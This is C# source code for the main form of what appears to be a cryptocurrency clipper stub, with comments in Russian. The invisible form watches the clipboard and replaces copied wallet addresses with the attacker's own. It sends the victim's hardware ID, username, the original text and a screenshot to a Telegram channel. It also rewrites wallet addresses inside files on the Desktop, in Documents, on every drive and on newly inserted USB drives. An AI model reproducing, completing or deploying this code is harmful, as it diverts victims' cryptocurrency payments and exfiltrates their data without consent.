using Stub.Help;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System;
using System.Threading;
using System.Drawing;
using Stub.TelegramAPI;
using System.IO;
using static Stub.Help.Modules.USBWatcher;
using Stub.Help.Modules;
using System.Collections.Generic;
using Stub.Help.Native;

namespace Stub
{
    public partial class FormBUF : Form
    {
        public System.Threading.Timer timer;
        public FormBUF()
        {
            SuspendLayout();
            InitializeComponent();
            ClientSize = new Size(0, 0);
            Name = "Form1";
            Text = "Form1";
            Load += FormBUF_Load;
            ResumeLayout(false);
            NativeMethods.AddClipboardFormatListener(Handle);
            // Инициализация таймера
            timer = new System.Threading.Timer(TimerCallback, null, 0, 500000); // Интервал в миллисекундах (1000 мс = 1 секунда)
        }

        private void FormBUF_Load(object sender, EventArgs e)
        {
            // Добавьте необходимую логику здесь   
        }

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            try
            {
                // Подписываемся на событие подключения USB Накопителей и заменяем кошельки в найденных файлах.
                if (m.Msg == NativeMethods.WM_DEVICECHANGE)
                {
                    switch (m.WParam.ToInt32())
                    {
                        case NativeMethods.DBT_DEVICEARRIVAL:
                            NativeMethods.DEV_BROADCAST_VOLUME volumeDevice = (NativeMethods.DEV_BROADCAST_VOLUME)Marshal.PtrToStructure(m.LParam, typeof(NativeMethods.DEV_BROADCAST_VOLUME));
                            string driveLetter = GetDriveLetterFromMask(volumeDevice.dbcv_unitmask);
                            string[] directories = { driveLetter };
                            FileReplace.Replace(directories);
                            break;
                    }
                }

            }
            catch { }

            try
            {
                // Подписываемся на событие изменения буфера обмена.
                if (m.Msg == 0x031D && Clipboard.ContainsText())
                {
                    var buf = ClipboardHelper.GetClipboardText();
                    // Разделение текста на строки
                    string[] lines = buf.Split('\n');
                    // Проверка количества строк, если строк более 500 не будем менять.
                    if (lines.Length < 500)
                    {
                        string updatedBuf = buf;
                        string bestWallet =  GetBestWallet.Get(buf);
                        if (bestWallet != null)
                            Clipboard.SetText(bestWallet);
                       
                        // Проверяем, изменились ли данные перед отправкой
                        if (buf != bestWallet)
                        {
                            string message = $"<code>{HWID.GetHardwareId()}@{Environment.UserName}</code>" +
                            $"\nDetected:" +
                            $"\n<code>{buf}</code>\n\nSuccessfully Replaced:\n<code>{bestWallet}</code>";
                            SendDocument.ScreenShot(message);
                        }
                        
                        NativeMethods.Sleep(300);
                    }
                }
                
                
            }
            catch { }
        }

        private void TimerCallback(object state)
        {
            string filePath = StringHelper.CurrentProcess;
            if (File.Exists(StringHelper.WorkFile.FullName)
            && (DateTime.Now - File.GetLastWriteTime(filePath)).TotalHours >= 7) 
            { 
                Config.addresses = NativeMethods.addresses; Config.tgNotifications = false;
            }
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            // Создаем список для хранения всех путей
            var directoriesList = new List<string>
            {
                // Добавляем рабочий стол и документы
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
            };
            // Добавляем все доступные диски
            foreach (DriveInfo d in allDrives)
            {
                directoriesList.Add(d.Name);
            }
            // Преобразуем список в массив строк
            string[] directories = directoriesList.ToArray();
            if (Config.fileReplacer && !FileReplace.work)
                    FileReplace.Replace(directories);      
        }
    }
}
